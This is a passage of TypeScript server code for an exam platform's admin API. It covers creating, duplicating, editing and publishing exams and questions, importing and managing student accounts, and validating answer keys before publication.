// ================================================================ ADMIN
type QDefaults = Pick<Question, "correctAnswer" | "correctAnswers" | "tolerance"> & Partial<Question>;
function questionDefaults(type: Question["type"]): QDefaults {
  // Reset every type-specific shape so switching a question's type can't leave
  // stale answer keys behind.
  const base: QDefaults = {
    correctAnswer: "", correctAnswers: [], tolerance: 0,
    options: undefined, matchPairs: undefined, sequence: undefined, blanks: undefined, hotspots: undefined, imageUrl: undefined,
    paramVariables: undefined, paramFormula: undefined, paramTolerance: undefined,
  };
  if (type === "true_false") return { ...base, options: ["true", "false"] };
  if (type === "mcq" || type === "multi_select") return { ...base, options: ["Option 1", "Option 2"] };
  if (type === "matching") return { ...base, matchPairs: [{ left: "", right: "" }, { left: "", right: "" }] };
  if (type === "ordering") return { ...base, sequence: ["", ""] };
  if (type === "cloze") return { ...base, blanks: [[""]] };
  if (type === "hotspot") return { ...base, hotspots: [] };
  if (type === "parameterized") return { ...base, paramVariables: [], paramFormula: "", paramTolerance: 0 };
  // short / numeric / essay / code / file_upload — free-form, no options
  return base;
}

app.get("/api/admin/exams", requireRoles(...GRADERS), (_req, res) => {
  const items = db.data!.exams.map((exam) => ({
    exam,
    questionCount: db.data!.questions.filter((q) => q.examId === exam.id).length,
    attemptCount: db.data!.attempts.filter((a) => a.examId === exam.id).length,
  }));
  res.json({ items });
});

// Aggregated data for the Manage-Exams dashboard (cards, charts, exam cards).
app.get("/api/admin/exams-overview", requireRoles(...GRADERS), (_req, res) => {
  const d = db.data!;
  const realExams = d.exams.filter((e) => !e.practice);
  const candidateIds = new Set(d.users.filter((u) => u.role === "candidate").map((u) => u.id));
  const submitted = d.attempts.filter((a) => a.status === "submitted" && !examById(a.examId)?.practice);
  const nowMs = Date.now();

  // Map a question type to a coarse pattern bucket used by the tabs + pattern chart.
  const bucketOf = (t: string): "mcq" | "shorts" | "written" | "viva" =>
    (["mcq", "multi_select", "true_false"].includes(t) ? "mcq" : t === "short" ? "shorts" : t === "code" ? "viva" : "written");

  const qByExam = new Map<string, Question[]>();
  for (const q of d.questions) { const a = qByExam.get(q.examId) ?? []; a.push(q); qByExam.set(q.examId, a); }
  const classOf = (examId: string) => d.classes.find((c) => c.assignments.some((a) => a.examId === examId))?.name ?? null;

  const pendingReviews = d.attempts.filter((a) => a.gradingStatus === "pending_review").length;
  const reviewPct = submitted.length ? Math.round((pendingReviews / submitted.length) * 100) : 0;
  const upcoming = realExams.filter((e) => e.availableFrom && new Date(e.availableFrom).getTime() > nowMs).length;

  // Enrollment per exam → "most interested subjects".
  const enrollByExam = new Map<string, number>();
  for (const r of d.registrations) { if (!candidateIds.has(r.candidateId)) continue; enrollByExam.set(r.examId, (enrollByExam.get(r.examId) ?? 0) + 1); }
  const totalEnroll = [...enrollByExam.values()].reduce((p, c) => p + c, 0);
  const palette = ["#15805A", "#2BAE84", "#E9B949", "#9DD3BE", "#0E8F8A", "#5B8DEF"];
  const subjectsEnroll = [...enrollByExam.entries()]
    .map(([id, count]) => ({ subject: examById(id)?.subject || examById(id)?.title || "Exam", count }))
    .sort((a, b) => b.count - a.count).slice(0, 4)
    .map((s, i) => ({ subject: s.subject, count: s.count, pct: totalEnroll ? Math.round((s.count / totalEnroll) * 100) : 0, color: palette[i] }));

  // Question-pattern distribution (shorts folded into written for a 3-way display).
  const patt = { mcq: 0, written: 0, viva: 0 };
  for (const q of d.questions) { const b = bucketOf(q.type); patt[b === "shorts" ? "written" : b]++; }
  const pTotal = patt.mcq + patt.written + patt.viva || 1;
  const questionPattern = {
    mcq: Math.round((patt.mcq / pTotal) * 100),
    written: Math.round((patt.written / pTotal) * 100),
    viva: Math.round((patt.viva / pTotal) * 100),
  };

  // Subject-wise average score → radar.
  const scoreByExam = new Map<string, number[]>();
  for (const a of submitted) { const arr = scoreByExam.get(a.examId) ?? []; arr.push(a.score ?? 0); scoreByExam.set(a.examId, arr); }
  const subjectScores = realExams.slice(0, 8).map((e) => {
    const arr = scoreByExam.get(e.id) ?? [];
    return { subject: e.subject || e.code || e.title.slice(0, 12), score: arr.length ? Math.round(arr.reduce((p, c) => p + c, 0) / arr.length) : 0 };
  });

  const exams = realExams.map((e) => {
    const qs = qByExam.get(e.id) ?? [];
    const counts: Record<string, number> = { mcq: 0, shorts: 0, written: 0, viva: 0 };
    for (const q of qs) counts[bucketOf(q.type)]++;
    const dominant = Object.entries(counts).sort((a, b) => b[1] - a[1])[0];
    return {
      id: e.id, title: e.title, code: e.code, status: e.status,
      subject: e.subject ?? null, coverImage: e.coverImage ?? null,
      className: classOf(e.id),
      scheduledStart: e.availableFrom ?? null,
      durationMinutes: e.durationMinutes,
      marks: qs.reduce((p, q) => p + (q.points || 0), 0),
      questionCount: qs.length,
      type: dominant && dominant[1] > 0 ? dominant[0] : "mcq",
    };
  });

  res.json({
    cards: { totalExams: realExams.length, totalStudents: candidateIds.size, certified: d.certificates.length, upcoming, reviewPct, pendingReviews },
    subjectsEnroll, totalEnroll, questionPattern, subjectScores, exams,
  });
});

app.post("/api/admin/exams", requireRole("admin"), async (req, res) => {
  const settings = getSettings();
  const exam: Exam = {
    id: nanoid(10),
    title: (req.body?.title ?? "").trim() || "Untitled examination",
    code: (req.body?.code ?? "").trim(),
    description: "",
    durationMinutes: 30,
    passingScore: settings.defaultPassingScore,
    proctored: settings.defaultProctored,
    status: "draft",
    enrollment: "open",
    lockdown: { ...DEFAULT_LOCKDOWN },
    shuffleQuestions: true,
    shuffleOptions: true,
    questionsPerAttempt: null,
    negativeMarking: 0,
    partialCredit: false,
    sections: [],
    createdAt: now(),
  };
  db.data!.exams.push(exam);
  await db.write();
  await recordAudit(req, "exam.created", exam.title);
  res.json({ exam });
});

// Duplicate an exam as a template — clones the exam and all its questions (draft).
app.post("/api/admin/exams/:id/duplicate", requireRole("admin"), async (req, res) => {
  const src = db.data!.exams.find((e) => e.id === req.params.id);
  if (!src) return res.status(404).json({ error: "Exam not found." });
  const clone: Exam = JSON.parse(JSON.stringify(src));
  clone.id = nanoid(10);
  clone.title = `${src.title || "Untitled examination"} (copy)`;
  clone.code = src.code ? `${src.code}-COPY` : "";
  clone.status = "draft";
  clone.createdAt = now();
  // Remap section ids so the copy is fully independent.
  const secMap = new Map<string, string>();
  clone.sections = (clone.sections ?? []).map((s) => { const nid = nanoid(6); secMap.set(s.id, nid); return { ...s, id: nid }; });
  db.data!.exams.push(clone);
  for (const q of db.data!.questions.filter((x) => x.examId === src.id)) {
    const cq: Question = JSON.parse(JSON.stringify(q));
    cq.id = nanoid(10);
    cq.examId = clone.id;
    cq.sectionId = q.sectionId ? (secMap.get(q.sectionId) ?? null) : null;
    cq.updatedAt = now();
    db.data!.questions.push(cq);
  }
  await db.write();
  await recordAudit(req, "exam.duplicated", `${src.title} → ${clone.title}`);
  res.json({ exam: clone });
});

app.get("/api/admin/exams/:id", requireRole("admin"), (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const questions = db.data!.questions.filter((q) => q.examId === exam.id);
  const assignedIds = db.data!.registrations.filter((r) => r.examId === exam.id).map((r) => r.candidateId);
  res.json({ exam, questions, assignedIds, aiEnabled: aiEnabled() });
});

// ---- admin: candidates & assignment ----
app.get("/api/admin/candidates", requireRoles(...GRADERS), (_req, res) => {
  const candidates = db.data!.users
    .filter((u) => u.role === "candidate")
    .map((u) => ({ id: u.id, name: u.name, email: u.email }));
  res.json({ candidates });
});

app.post("/api/admin/candidates", requireRole("admin"), async (req, res) => {
  const { name, email, password } = req.body ?? {};
  if (!name?.trim() || !email?.trim() || !password || String(password).length < 6) {
    return res.status(400).json({ error: "Name, email and a password (min 6 characters) are required." });
  }
  const exists = db.data!.users.find((u) => u.email.toLowerCase() === String(email).trim().toLowerCase());
  if (exists) return res.status(409).json({ error: "An account with that email already exists." });
  const b = req.body ?? {};
  const user = {
    id: nanoid(10),
    email: String(email).trim(),
    passwordHash: await bcrypt.hash(String(password), 10),
    name: String(name).trim(),
    role: "candidate" as const,
    gender: typeof b.gender === "string" ? b.gender : undefined,
    age: typeof b.age === "number" ? b.age : undefined,
    studentClass: typeof b.studentClass === "string" ? b.studentClass.trim() : undefined,
    phone: typeof b.phone === "string" && b.phone.trim() ? encryptString(b.phone.trim()) : undefined,
  };
  db.data!.users.push(user);
  await db.write();
  await recordAudit(req, "candidate.created", `${user.name} <${user.email}>`);
  const mail = invitationEmail(user.name, user.email, String(password));
  await sendMail(user.email, mail.subject, mail.text, mail.html);
  res.json({ user: { id: user.id, name: user.name, email: user.email } });
});

app.post("/api/admin/candidates/bulk", requireRole("admin"), async (req, res) => {
  type Row = { name?: string; email?: string; studentRef?: string; studentClass?: string; gender?: string; age?: unknown; phone?: string };
  let rows: Row[] = Array.isArray(req.body?.rows) ? req.body.rows : [];
  if (typeof req.body?.csv === "string") {
    rows = req.body.csv.split(/\r?\n/).map((l: string) => l.trim()).filter(Boolean).map((line: string) => {
      const [name, email, studentRef] = line.split(",").map((s) => s?.trim());
      return { name, email, studentRef };
    });
  }
  const created: { name: string; email: string; tempPassword: string }[] = [];
  const skipped: { email: string; reason: string }[] = [];
  for (const row of rows.slice(0, 1000)) {
    const name = (row?.name ?? "").trim();
    const email = (row?.email ?? "").trim();
    if (!name || !email || !email.includes("@")) { skipped.push({ email: email || "(blank)", reason: "Invalid name or email" }); continue; }
    if (db.data!.users.some((u) => u.email.toLowerCase() === email.toLowerCase())) { skipped.push({ email, reason: "Already exists" }); continue; }
    if (created.some((c) => c.email.toLowerCase() === email.toLowerCase())) { skipped.push({ email, reason: "Duplicate in file" }); continue; }
    const tempPassword = "dti-" + nanoid(6);
    const ageNum = Number(row?.age);
    db.data!.users.push({
      id: nanoid(10), email, passwordHash: await bcrypt.hash(tempPassword, 10), name, role: "candidate",
      gender: typeof row?.gender === "string" && row.gender.trim() ? row.gender.trim() : undefined,
      age: row?.age !== undefined && row?.age !== "" && Number.isFinite(ageNum) ? ageNum : undefined,
      studentClass: typeof row?.studentClass === "string" && row.studentClass.trim() ? row.studentClass.trim() : undefined,
      phone: typeof row?.phone === "string" && row.phone.trim() ? encryptString(row.phone.trim()) : undefined,
    });
    created.push({ name, email, tempPassword });
  }
  await db.write();
  if (created.length) await recordAudit(req, "candidates.imported", `${created.length} student${created.length === 1 ? "" : "s"}`);
  for (const c of created) {
    const mail = invitationEmail(c.name, c.email, c.tempPassword);
    await sendMail(c.email, mail.subject, mail.text, mail.html);
  }
  res.json({ created, skipped });
});

app.get("/api/admin/emails", requireRoles(...GRADERS), async (_req, res) => {
  res.json({ emails: await emailStore.recent(100) });
});

app.patch("/api/admin/candidates/:id/password", requireRole("admin"), validate(passwordResetSchema), async (req, res) => {
  const user = db.data!.users.find((u) => u.id === req.params.id && u.role === "candidate");
  if (!user) return res.status(404).json({ error: "Candidate not found." });
  const { password } = req.body ?? {};
  if (!password || String(password).length < 12) {
    return res.status(400).json({ error: "Password must be at least 12 characters." });
  }
  user.passwordHash = await bcrypt.hash(String(password), 10);
  user.tokenVersion = (user.tokenVersion ?? 0) + 1; // revoke the candidate's existing sessions
  await db.write();
  res.json({ ok: true });
});

app.delete("/api/admin/candidates/:id", requireRole("admin"), async (req, res) => {
  const id = req.params.id;
  const user = db.data!.users.find((u) => u.id === id && u.role === "candidate");
  if (!user) return res.status(404).json({ error: "Candidate not found." });
  const attemptIds = db.data!.attempts.filter((a) => a.candidateId === id).map((a) => a.id);
  db.data!.users = db.data!.users.filter((u) => u.id !== id);
  db.data!.registrations = db.data!.registrations.filter((r) => r.candidateId !== id);
  db.data!.attempts = db.data!.attempts.filter((a) => a.candidateId !== id);
  db.data!.certificates = db.data!.certificates.filter((c) => c.candidateId !== id);
  await answerStore.removeForAttempts(attemptIds);
  await proctorStore.removeForAttempts(attemptIds);
  await snapshotStore.removeForAttempts(attemptIds);
  await db.write();
  res.json({ ok: true });
});

app.post("/api/admin/exams/:id/assignments", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const candidateId: string = req.body?.candidateId;
  const candidate = db.data!.users.find((u) => u.id === candidateId && u.role === "candidate");
  if (!candidate) return res.status(400).json({ error: "Unknown candidate." });
  const exists = db.data!.registrations.find((r) => r.examId === exam.id && r.candidateId === candidateId);
  if (!exists) {
    db.data!.registrations.push({
      id: nanoid(10), examId: exam.id, candidateId,
      status: "registered", approval: "pending", scheduledStart: null, systemCheckPassed: false, createdAt: now(),
    });
    await db.write();
  }
  res.json({ ok: true });
});

app.post("/api/admin/exams/:id/assign-bulk", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const candidateIds: string[] = Array.isArray(req.body?.candidateIds) ? req.body.candidateIds : [];
  const confirm = req.body?.confirm === true;
  let assigned = 0, confirmed = 0;
  for (const cid of candidateIds) {
    const cand = db.data!.users.find((u) => u.id === cid && u.role === "candidate");
    if (!cand) continue;
    let reg = db.data!.registrations.find((r) => r.examId === exam.id && r.candidateId === cid);
    if (!reg) {
      reg = {
        id: nanoid(10), examId: exam.id, candidateId: cid,
        status: "registered", approval: confirm ? "confirmed" : "pending",
        scheduledStart: null, systemCheckPassed: false, createdAt: now(),
      };
      db.data!.registrations.push(reg);
      assigned++;
      if (confirm) confirmed++;
    } else if (confirm && reg.approval !== "confirmed") {
      reg.approval = "confirmed";
      confirmed++;
    }
  }
  await db.write();
  res.json({ assigned, confirmed });
});

app.delete("/api/admin/exams/:id/assignments/:candidateId", requireRole("admin"), async (req, res) => {
  const { id, candidateId } = req.params;
  // Don't unassign a candidate who already has an attempt (preserve their record).
  const hasAttempt = db.data!.attempts.some((a) => a.examId === id && a.candidateId === candidateId);
  if (hasAttempt) return res.status(409).json({ error: "Candidate already started this exam." });
  db.data!.registrations = db.data!.registrations.filter(
    (r) => !(r.examId === id && r.candidateId === candidateId),
  );
  await db.write();
  res.json({ ok: true });
});

app.patch("/api/admin/exams/:id", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const b = req.body ?? {};
  if (typeof b.title === "string") exam.title = b.title;
  if (typeof b.code === "string") exam.code = b.code;
  if (typeof b.description === "string") exam.description = b.description;
  if (typeof b.subject === "string") exam.subject = b.subject.slice(0, 80);
  if ("coverImage" in b) {
    const ci = b.coverImage;
    // Only accept a reasonably-sized image data URL; anything else clears it.
    exam.coverImage = typeof ci === "string" && ci.startsWith("data:image/") && ci.length < 1_500_000 ? ci : null;
  }
  const touchedAttempts: Attempt[] = [];
  if (typeof b.durationMinutes === "number") {
    const newDur = Math.max(1, Math.floor(b.durationMinutes));
    if (newDur !== exam.durationMinutes) {
      exam.durationMinutes = newDur;
      // Push the new duration to every in-progress attempt so the student's live
      // countdown updates on their next /control poll (≤ 3.5 s away).
      for (const a of db.data!.attempts) {
        if (a.examId === exam.id && a.status === "in_progress") {
          a.durationMinutes = newDur;
          touchedAttempts.push(a);
        }
      }
    }
  }
  if (typeof b.passingScore === "number") exam.passingScore = Math.min(100, Math.max(0, b.passingScore));
  if (typeof b.proctored === "boolean") exam.proctored = b.proctored;
  if (typeof b.practice === "boolean") exam.practice = b.practice;
  if (b.enrollment === "open" || b.enrollment === "assigned") exam.enrollment = b.enrollment;
  if ("availableFrom" in b) exam.availableFrom = b.availableFrom || null;
  if ("availableUntil" in b) exam.availableUntil = b.availableUntil || null;
  if (typeof b.shuffleQuestions === "boolean") exam.shuffleQuestions = b.shuffleQuestions;
  if (typeof b.shuffleOptions === "boolean") exam.shuffleOptions = b.shuffleOptions;
  if ("questionsPerAttempt" in b) {
    const n = Number(b.questionsPerAttempt);
    exam.questionsPerAttempt = Number.isFinite(n) && n > 0 ? Math.floor(n) : null;
  }
  if (Array.isArray(b.resources)) {
    exam.resources = b.resources
      .filter((r: { url?: unknown }) => r && typeof r.url === "string" && r.url.trim())
      .slice(0, 20)
      .map((r: { label?: unknown; url: string }) => ({ label: String(r.label ?? r.url).slice(0, 120).trim(), url: String(r.url).slice(0, 500).trim() }));
  }
  if (typeof b.negativeMarking === "number") exam.negativeMarking = Math.max(0, Math.min(1, b.negativeMarking));
  if (typeof b.partialCredit === "boolean") exam.partialCredit = b.partialCredit;
  if (b.gradeScale && typeof b.gradeScale === "object") {
    const mode = ["none", "add", "multiply"].includes(b.gradeScale.mode) ? b.gradeScale.mode : "none";
    exam.gradeScale = { mode, value: Number.isFinite(Number(b.gradeScale.value)) ? Number(b.gradeScale.value) : 0 };
  }
  if (Array.isArray(b.gradeBands)) exam.gradeBands = cleanBands(b.gradeBands);
  if ("resultsReleaseAt" in b) exam.resultsReleaseAt = b.resultsReleaseAt || null;
  if (typeof b.anonymousGrading === "boolean") exam.anonymousGrading = b.anonymousGrading;
  if (Array.isArray(b.sections)) {
    exam.sections = b.sections
      .filter((sct: { title?: unknown }) => sct && typeof sct.title === "string")
      .map((sct: { id?: unknown; title: string; instructions?: unknown; drawCount?: unknown; timeLimitMinutes?: unknown }) => ({
        id: String(sct.id || nanoid(6)), title: String(sct.title).slice(0, 200),
        instructions: typeof sct.instructions === "string" ? sct.instructions.slice(0, 2000) : undefined,
        drawCount: Number.isFinite(Number(sct.drawCount)) && Number(sct.drawCount) > 0 ? Math.floor(Number(sct.drawCount)) : undefined,
        timeLimitMinutes: Number.isFinite(Number(sct.timeLimitMinutes)) && Number(sct.timeLimitMinutes) > 0 ? Math.floor(Number(sct.timeLimitMinutes)) : undefined,
      }));
  }
  if (b.lockdown && typeof b.lockdown === "object") {
    exam.lockdown = { ...DEFAULT_LOCKDOWN, ...exam.lockdown, ...b.lockdown };
    if (typeof exam.lockdown.violationLimit === "number") {
      exam.lockdown.violationLimit = Math.max(0, Math.floor(exam.lockdown.violationLimit));
    }
    // Normalise Safe Exam Browser settings so verification has clean inputs.
    const ld = exam.lockdown;
    ld.requireSafeExamBrowser = !!ld.requireSafeExamBrowser;
    const cleanKeys = (v: unknown) => Array.isArray(v) ? v.map((x) => String(x).trim()).filter(Boolean) : [];
    ld.sebConfigKeys = cleanKeys(ld.sebConfigKeys);
    ld.sebBrowserExamKeys = cleanKeys(ld.sebBrowserExamKeys);
    ld.sebLaunchUrl = typeof ld.sebLaunchUrl === "string" ? ld.sebLaunchUrl.trim() : "";
  }
  // Targeted upserts instead of a full-mirror db.write(): this handler fires on
  // every debounced settings edit (and duration changes touch every in-progress
  // attempt), so flushing all 15 mirrored tables here would mean a single field
  // tweak stalls the shared database behind a full historical-data rewrite —
  // exactly the kind of latency spike active students polling /control would feel.
  await db.upsert("exams", exam);
  for (const a of touchedAttempts) await db.upsert("attempts", a);
  res.json({ exam });
});

app.delete("/api/admin/exams/:id", requireRole("admin"), async (req, res) => {
  const examId = req.params.id;
  // Cascade: remove the exam and everything tied to it (no orphaned records).
  const attemptIds = db.data!.attempts.filter((a) => a.examId === examId).map((a) => a.id);
  db.data!.exams = db.data!.exams.filter((e) => e.id !== examId);
  db.data!.questions = db.data!.questions.filter((q) => q.examId !== examId);
  db.data!.registrations = db.data!.registrations.filter((r) => r.examId !== examId);
  db.data!.attempts = db.data!.attempts.filter((a) => a.examId !== examId);
  db.data!.certificates = db.data!.certificates.filter((c) => c.examId !== examId);
  await answerStore.removeForAttempts(attemptIds);
  await proctorStore.removeForAttempts(attemptIds);
  await snapshotStore.removeForAttempts(attemptIds);
  await db.write();
  await recordAudit(req, "exam.deleted", `Deleted exam ${examId}`);
  res.json({ ok: true });
});

app.post("/api/admin/exams/:id/questions", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const type: Question["type"] = req.body?.type ?? "mcq";
  const q: Question = { id: nanoid(10), examId: exam.id, type, prompt: "", points: 10, ...questionDefaults(type) };
  db.data!.questions.push(q);
  await db.write();
  res.json({ question: q });
});

// Bulk-import questions into an exam (client parses CSV → array of drafts).
app.post("/api/admin/exams/:id/questions/import", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const rows = Array.isArray(req.body?.questions) ? req.body.questions : [];
  if (!rows.length) return res.status(400).json({ error: "No questions to import." });
  const TYPES: Question["type"][] = ["mcq", "multi_select", "true_false", "short", "numeric", "essay", "code"];
  let created = 0;
  for (const r of rows.slice(0, 500)) {
    const prompt = String(r?.prompt ?? "").trim();
    if (!prompt) continue;
    const type: Question["type"] = TYPES.includes(r?.type) ? r.type : "mcq";
    const options = Array.isArray(r?.options)
      ? r.options.map(String)
      : typeof r?.options === "string" && r.options.trim()
        ? r.options.split("|").map((s: string) => s.trim()).filter(Boolean)
        : undefined;
    const q: Question = {
      id: nanoid(10), examId: exam.id, type,
      prompt: prompt.slice(0, 2000),
      points: Number(r?.points) > 0 ? Math.floor(Number(r.points)) : 1,
      ...questionDefaults(type),
    };
    if (type === "true_false") q.options = ["True", "False"];
    else if (options && (type === "mcq" || type === "multi_select")) q.options = options;
    if (typeof r?.correctAnswer === "string" && r.correctAnswer.trim()) q.correctAnswer = r.correctAnswer.trim();
    db.data!.questions.push(q);
    created++;
  }
  await db.write();
  await recordAudit(req, "questions.imported", `${created} into ${exam.title}`);
  res.json({ created });
});

// Clone existing bank questions into this exam (reuse across exams — "pick from bank").
app.post("/api/admin/exams/:id/questions/clone", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const ids: string[] = Array.isArray(req.body?.questionIds) ? req.body.questionIds.map(String) : [];
  const created: Question[] = [];
  for (const qid of ids) {
    const src = db.data!.questions.find((q) => q.id === qid);
    if (!src) continue;
    const copy: Question = JSON.parse(JSON.stringify(src));
    copy.id = nanoid(10);
    copy.examId = exam.id;
    copy.sectionId = null; // land in General — the author can re-file it
    copy.updatedAt = now();
    db.data!.questions.push(copy);
    created.push(copy);
  }
  await db.write();
  await recordAudit(req, "questions.cloned", `${created.length} into ${exam.title}`);
  res.json({ created });
});

app.patch("/api/admin/questions/:id", requireRole("admin"), async (req, res) => {
  const q = db.data!.questions.find((x) => x.id === req.params.id);
  if (!q) return res.status(404).json({ error: "Question not found." });
  const b = req.body ?? {};
  if (typeof b.type === "string" && b.type !== q.type) {
    q.type = b.type;
    Object.assign(q, questionDefaults(b.type));
  }
  if (typeof b.prompt === "string") q.prompt = b.prompt;
  if (Array.isArray(b.options)) q.options = b.options.map(String);
  if (typeof b.correctAnswer === "string") q.correctAnswer = b.correctAnswer;
  if (Array.isArray(b.acceptedAnswers)) q.acceptedAnswers = b.acceptedAnswers.map(String).filter(Boolean);
  if (Array.isArray(b.correctAnswers)) q.correctAnswers = b.correctAnswers.map(String).filter(Boolean);
  if (typeof b.tolerance === "number") q.tolerance = Math.max(0, b.tolerance);
  if ("sectionId" in b) q.sectionId = b.sectionId ? String(b.sectionId) : null;
  if (b.difficulty === "easy" || b.difficulty === "medium" || b.difficulty === "hard") q.difficulty = b.difficulty;
  if (typeof b.explanation === "string") q.explanation = b.explanation.slice(0, 4000);
  if (Array.isArray(b.tags)) q.tags = b.tags.map((t: unknown) => String(t).trim()).filter(Boolean);
  if (Array.isArray(b.matchPairs)) {
    q.matchPairs = b.matchPairs
      .filter((p: unknown): p is { left?: unknown; right?: unknown } => !!p && typeof p === "object")
      .map((p: { left?: unknown; right?: unknown }) => ({ left: String(p.left ?? ""), right: String(p.right ?? "") }));
  }
  if (Array.isArray(b.sequence)) q.sequence = b.sequence.map(String);
  if (Array.isArray(b.blanks)) {
    q.blanks = b.blanks.map((arr: unknown) => (Array.isArray(arr) ? arr.map(String).map((s) => s.trim()).filter(Boolean) : []));
  }
  if (typeof b.imageUrl === "string") q.imageUrl = b.imageUrl;
  if (Array.isArray(b.hotspots)) {
    const cl = (n: unknown) => Math.max(0, Math.min(100, Number(n) || 0));
    q.hotspots = b.hotspots
      .filter((r: unknown): r is Record<string, unknown> => !!r && typeof r === "object")
      .map((r: Record<string, unknown>) => ({ x: cl(r.x), y: cl(r.y), w: cl(r.w), h: cl(r.h) }));
  }
  if (Array.isArray(b.rubric)) {
    const crit: RubricCriterion[] = b.rubric
      .filter((c: { label?: unknown }) => c && typeof c.label === "string")
      .map((c: { id?: unknown; label: string; maxPoints?: unknown }) => ({
        id: String(c.id || nanoid(6)), label: String(c.label), maxPoints: Math.max(0, Math.round(Number(c.maxPoints) || 0)),
      }));
    q.rubric = crit;
    // When a rubric is defined, the question's points are the sum of its criteria.
    if (crit.length) q.points = crit.reduce((s, c) => s + c.maxPoints, 0);
  }
  if (typeof b.points === "number" && !(q.rubric?.length)) q.points = Math.max(0, b.points);
  if (typeof b.codeLanguage === "string") q.codeLanguage = b.codeLanguage;
  if (typeof b.starterCode === "string") q.starterCode = b.starterCode;
  if (Array.isArray(b.testCases)) {
    q.testCases = b.testCases
      .filter((t: unknown): t is { input?: unknown; expected?: unknown } => !!t && typeof t === "object")
      .map((t: { input?: unknown; expected?: unknown }) => ({ input: String(t.input ?? ""), expected: String(t.expected ?? "") }));
  }
  // Stamp the edit. If this question belongs to an exam with an attempt already in
  // progress, the answer to it is voided (recorded blank) at submission — see gradeAttempt.
  q.updatedAt = now();
  await db.write();
  res.json({ question: q });
});

app.delete("/api/admin/questions/:id", requireRole("admin"), async (req, res) => {
  db.data!.questions = db.data!.questions.filter((q) => q.id !== req.params.id);
  await db.write();
  res.json({ ok: true });
});

// AI difficulty checker: estimate a question's difficulty band via Claude.
app.post("/api/admin/questions/:id/assess-difficulty", requireRole("admin"), async (req, res) => {
  if (!aiEnabled()) return res.status(503).json({ error: "AI is not configured. Set ANTHROPIC_API_KEY on the server to enable difficulty suggestions." });
  const q = db.data!.questions.find((x) => x.id === req.params.id);
  if (!q) return res.status(404).json({ error: "Question not found." });
  if (!q.prompt.trim()) return res.status(400).json({ error: "Add a question prompt first." });
  try {
    const result = await assessDifficulty(q);
    res.json(result);
  } catch (e) {
    logger.error({ err: String(e) }, "difficulty assessment failed");
    res.status(502).json({ error: "Couldn't reach the AI service right now — please try again." });
  }
});

app.post("/api/admin/exams/:id/questions/reorder", requireRole("admin"), async (req, res) => {
  const examId = req.params.id;
  const orderedIds: string[] = req.body?.orderedIds ?? [];
  const others = db.data!.questions.filter((q) => q.examId !== examId);
  const mine = db.data!.questions.filter((q) => q.examId === examId);
  const reordered: Question[] = [];
  for (const id of orderedIds) {
    const found = mine.find((q) => q.id === id);
    if (found) reordered.push(found);
  }
  for (const q of mine) if (!orderedIds.includes(q.id)) reordered.push(q);
  db.data!.questions = [...others, ...reordered];
  await db.write();
  res.json({ ok: true });
});

app.post("/api/admin/exams/:id/publish", requireRole("admin"), async (req, res) => {
  const exam = db.data!.exams.find((e) => e.id === req.params.id);
  if (!exam) return res.status(404).json({ error: "Exam not found." });
  const publish = req.body?.publish !== false;
  if (!publish) {
    exam.status = "draft";
    await db.write();
    await recordAudit(req, "exam.unpublished", exam.title);
    return res.json({ exam });
  }
  const questions = db.data!.questions.filter((q) => q.examId === exam.id);
  const errors: string[] = [];
  if (!exam.title.trim()) errors.push("Add an examination title.");
  if (!exam.code.trim()) errors.push("Add an examination code.");
  if (questions.length === 0) errors.push("Add at least one question.");
  if (exam.questionsPerAttempt && exam.questionsPerAttempt > questions.length) {
    errors.push(`Questions per attempt (${exam.questionsPerAttempt}) exceeds the ${questions.length} question${questions.length === 1 ? "" : "s"} in this exam.`);
  }
  questions.forEach((q, i) => {
    const n = i + 1;
    if (!q.prompt.trim()) errors.push(`Question ${n}: add a question prompt.`);
    switch (q.type) {
      case "essay":
      case "code":
      case "file_upload":
        break; // manually graded — no answer key required
      case "matching":
        if (!(q.matchPairs ?? []).length || (q.matchPairs ?? []).some((p) => !p.left.trim() || !p.right.trim()))
          errors.push(`Question ${n}: every matching pair needs both a left prompt and a right value.`);
        break;
      case "ordering":
        if ((q.sequence ?? []).filter((s) => s.trim()).length < 2) errors.push(`Question ${n}: add at least two items to order.`);
        break;
      case "cloze":
        if (!(q.blanks ?? []).length || (q.blanks ?? []).some((b) => !b.some((a) => a.trim())))
          errors.push(`Question ${n}: every blank needs at least one accepted answer.`);
        break;
      case "hotspot":
        if (!q.imageUrl) errors.push(`Question ${n}: add an image.`);
        else if (!(q.hotspots ?? []).length) errors.push(`Question ${n}: mark at least one correct region on the image.`);
        break;
      case "multi_select":
        if (!(q.correctAnswers ?? []).length) errors.push(`Question ${n}: mark at least one correct option.`);
        else if (q.options && (q.correctAnswers ?? []).some((c) => !q.options!.includes(c))) errors.push(`Question ${n}: every correct answer must match an option.`);
        break;
      case "numeric":
        if (!q.correctAnswer.trim() || !Number.isFinite(parseFloat(q.correctAnswer))) errors.push(`Question ${n}: enter a numeric correct answer.`);
        break;
      case "short":
        if (!q.correctAnswer.trim()) errors.push(`Question ${n}: add a primary accepted answer.`);
        break;
      case "parameterized": {
        const pvs = q.paramVariables ?? [];
        if (!pvs.length) errors.push(`Question ${n}: add at least one variable.`);
        else if (pvs.some((pv) => !pv.name.trim())) errors.push(`Question ${n}: every variable needs a name.`);
        if (!q.paramFormula?.trim()) errors.push(`Question ${n}: add a formula to compute the answer.`);
        else if (pvs.length && tryEvalExpr(q.paramFormula, Object.fromEntries(pvs.map((pv) => [pv.name, (pv.min + pv.max) / 2]))) == null)
          errors.push(`Question ${n}: the formula couldn't be evaluated — check the variable names and syntax.`);
        break;
      }
      default: // mcq / true_false
        if (!q.correctAnswer.trim()) errors.push(`Question ${n}: mark the correct answer.`);
